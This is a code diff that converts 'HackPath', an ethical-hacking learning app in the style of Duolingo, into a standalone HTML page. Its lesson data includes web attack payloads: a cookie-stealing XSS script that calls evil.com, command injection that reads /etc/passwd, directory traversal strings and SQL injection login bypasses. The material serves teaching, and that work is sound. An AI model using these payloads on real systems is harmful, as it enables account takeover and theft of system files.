@@ -1,4 +1,22 @@
-import { useState, useEffect, useCallback, useMemo, useRef } from "react";
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>HackPath — Learn Ethical Hacking</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🔒</text></svg>">
+<style>
+  html, body, #root { margin: 0; padding: 0; min-height: 100vh; background: #0a0e17; }
+</style>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/react/18.2.0/umd/react.production.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/react-dom/18.2.0/umd/react-dom.production.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/babel-standalone/7.23.9/babel.min.js"></script>
+</head>
+<body>
+<div id="root"></div>
+<script type="text/babel">
+const { useState, useEffect, useCallback, useMemo, useRef } = React;
+
 
 /* HackPath v8 — Full Ethical Hacking Learning Platform
    14 units · 74 levels · Duolingo-style mastery
@@ -17,14 +35,14 @@ const SFX = {
   tap: () => beep(800, 0.05, "sine", 0.05),
 };
 
-// Storage (per-user, persistent)
+// Storage (per-user, persistent via localStorage)
 const sKey = (u, k) => `hp8-${u}-${k}`;
-const saveP = (u, p) => { try { window.storage?.set(sKey(u, "p"), JSON.stringify(p)); } catch(e){} };
-const loadP = async (u) => { try { const r = await window.storage?.get(sKey(u, "p")); return r ? JSON.parse(r.value) : null; } catch(e){ return null; } };
-const saveOS = (u, o) => { try { window.storage?.set(sKey(u, "os"), JSON.stringify(o)); } catch(e){} };
-const loadOS = async (u) => { try { const r = await window.storage?.get(sKey(u, "os")); return r ? JSON.parse(r.value) : null; } catch(e){ return null; } };
-const saveU = (u, p) => { try { window.storage?.set(sKey(u, "a"), p); } catch(e){} };
-const checkU = async (u) => { try { const r = await window.storage?.get(sKey(u, "a")); return r ? r.value : null; } catch(e){ return null; } };
+const saveP = (u, p) => { try { localStorage.setItem(sKey(u, "p"), JSON.stringify(p)); } catch(e){} };
+const loadP = async (u) => { try { const r = localStorage.getItem(sKey(u, "p")); return r ? JSON.parse(r) : null; } catch(e){ return null; } };
+const saveOS = (u, o) => { try { localStorage.setItem(sKey(u, "os"), JSON.stringify(o)); } catch(e){} };
+const loadOS = async (u) => { try { const r = localStorage.getItem(sKey(u, "os")); return r ? JSON.parse(r) : null; } catch(e){ return null; } };
+const saveU = (u, p) => { try { localStorage.setItem(sKey(u, "a"), p); } catch(e){} };
+const checkU = async (u) => { try { const r = localStorage.getItem(sKey(u, "a")); return r || null; } catch(e){ return null; } };
 const shuffle = (a) => { const b=[...a]; for(let i=b.length-1;i>0;i--){const j=Math.floor(Math.random()*(i+1));[b[i],b[j]]=[b[j],b[i]];} return b; };
 
 // Username profanity filter — blocks slurs without false-flagging normal words
@@ -366,8 +384,8 @@ const UNITS_5_7 = [
       {id:"u6l3",title:"XSS & More Injection",rounds:[
         {type:"teach",text:"XSS = planting a booby trap on a website. You hide code in a comment or message. When someone else views it, the trap springs in THEIR browser — it can steal their login cookie (like copying their house key). Stored XSS = the trap stays forever in the database. Reflected XSS = only works through a special trick link."},
         {type:"pick",q:"Which XSS type is most dangerous?",opts:["Stored — persists in database","Reflected — in URL only","DOM-based","None are dangerous"],a:"Stored — persists in database",why:"Stored XSS affects every user who views the page — it's saved permanently."},
-        {type:"teach",text:"XSS payloads: <script>document.location='http://evil.com/steal?c='+document.cookie</script> steals cookies. <img src=x onerror=alert(1)> bypasses basic script tag filters. <svg onload=alert(1)> is another bypass."},
-        {type:"type",q:"Basic XSS test payload:",a:["<script>alert(1)</script>","<script>alert('XSS')</script>","<img src=x onerror=alert(1)>"],why:"If alert(1) pops up, the site is vulnerable to XSS."},
+        {type:"teach",text:"XSS payloads: <script>document.location='http://evil.com/steal?c='+document.cookie<\/script> steals cookies. <img src=x onerror=alert(1)> bypasses basic script tag filters. <svg onload=alert(1)> is another bypass."},
+        {type:"type",q:"Basic XSS test payload:",a:["<script>alert(1)<\/script>","<script>alert('XSS')<\/script>","<img src=x onerror=alert(1)>"],why:"If alert(1) pops up, the site is vulnerable to XSS."},
         {type:"teach",text:"Command Injection — when a web app passes user input to a system command. If a ping tool does: ping INPUT and you type 127.0.0.1; cat /etc/passwd — it runs BOTH commands. Separators: ; (run both), && (run second if first succeeds), | (pipe), || (run second if first fails)."},
         {type:"type",q:"Inject a command to read /etc/passwd through a vulnerable ping form:",a:["127.0.0.1; cat /etc/passwd","127.0.0.1 ; cat /etc/passwd","| cat /etc/passwd","; cat /etc/passwd"],why:"; separates commands — the server runs ping AND cat."},
         {type:"teach",text:"Local File Inclusion (LFI) — when a page includes files based on user input: page.php?file=about.html. Try: page.php?file=../../../../etc/passwd to read system files by traversing directories with ../"},
@@ -402,7 +420,7 @@ const UNITS_5_7 = [
       {id:"u6l6",title:"Mastery Test: Web Attacks",rounds:[
         {type:"type",q:"First character to test for SQL injection:",a:["'","single quote"],why:"Single quote breaks SQL string syntax."},
         {type:"type",q:"SQLi payload to bypass a login form:",a:["admin'--","' OR 1=1--","admin' OR 1=1--","' or 1=1--","admin'-- "],why:"These payloads manipulate the SQL WHERE clause."},
-        {type:"type",q:"Basic XSS test payload:",a:["<script>alert(1)</script>","<script>alert('XSS')</script>","<img src=x onerror=alert(1)>"],why:"If it executes, the site doesn't sanitize input."},
+        {type:"type",q:"Basic XSS test payload:",a:["<script>alert(1)<\/script>","<script>alert('XSS')<\/script>","<img src=x onerror=alert(1)>"],why:"If it executes, the site doesn't sanitize input."},
         {type:"type",q:"Command injection: read /etc/passwd through a ping form:",a:["; cat /etc/passwd","127.0.0.1; cat /etc/passwd","| cat /etc/passwd"],why:"Semicolon separates commands for the shell."},
         {type:"type",q:"LFI: traverse directories to read /etc/passwd:",a:["../../../../etc/passwd","../../../etc/passwd","....//....//etc/passwd"],why:"../ moves up directory levels."},
         {type:"type",q:"What vulnerability: changing /user/123 to /user/124 shows another person's data:",a:["idor","IDOR","insecure direct object reference"],why:"IDOR = accessing objects by changing direct references."},
@@ -572,7 +590,7 @@ const UNITS_8_10 = [
       {id:"u10l3",title:"Writing Reports",rounds:[
         {type:"teach",text:"A good bug report needs: Title (clear, specific), Severity (critical/high/medium/low), Description (what the vulnerability is), Steps to Reproduce (exact steps anyone can follow), Impact (what an attacker could do), Remediation (how to fix it)."},
         {type:"order",q:"Order the sections of a bug report:",items:["Title & Severity","Description of vulnerability","Steps to Reproduce","Impact assessment","Remediation recommendation"],why:"This structure makes reports clear and actionable for developers."},
-        {type:"teach",text:"Steps to Reproduce must be EXACT. Bad: 'I found XSS on the search page.' Good: '1. Go to https://target.com/search 2. Enter <script>alert(document.domain)</script> in the search box 3. Click Search 4. Observe JavaScript alert with domain name.' Include screenshots and HTTP requests."},
+        {type:"teach",text:"Steps to Reproduce must be EXACT. Bad: 'I found XSS on the search page.' Good: '1. Go to https://target.com/search 2. Enter <script>alert(document.domain)<\/script> in the search box 3. Click Search 4. Observe JavaScript alert with domain name.' Include screenshots and HTTP requests."},
         {type:"pick",q:"What makes the difference between a good and bad bug report?",opts:["Clear, reproducible steps","Fancy formatting","Long descriptions","Multiple screenshots"],a:"Clear, reproducible steps",why:"If the team can't reproduce your bug, they can't fix it or pay you."},
         {type:"teach",text:"Impact statement: Don't just say 'XSS'. Say 'An attacker could steal session cookies of any user who visits the /search page, allowing full account takeover. This affects all 500,000 registered users.' Business impact gets higher bounties."},
         {type:"tf",q:"Including the business impact of a vulnerability can increase your bounty payout.",a:true,why:"Programs pay based on impact. Explaining real-world consequences demonstrates severity."}
@@ -1335,7 +1353,7 @@ const LessonSession = ({ level, userOS, onComplete }) => {
 };
 
 // ═══ MAIN APP ═══
-export default function HackPath() {
+function HackPath() {
   const [user, setUser] = useState(null);
   const [userOS, setUserOS] = useState(null);
   const [progress, setProgress] = useState({});
@@ -1428,3 +1446,11 @@ export default function HackPath() {
     </>
   );
 }
+
+
+// Mount the app
+const root = ReactDOM.createRoot(document.getElementById('root'));
+root.render(React.createElement(HackPath));
+</script>
+</body>
+</html>
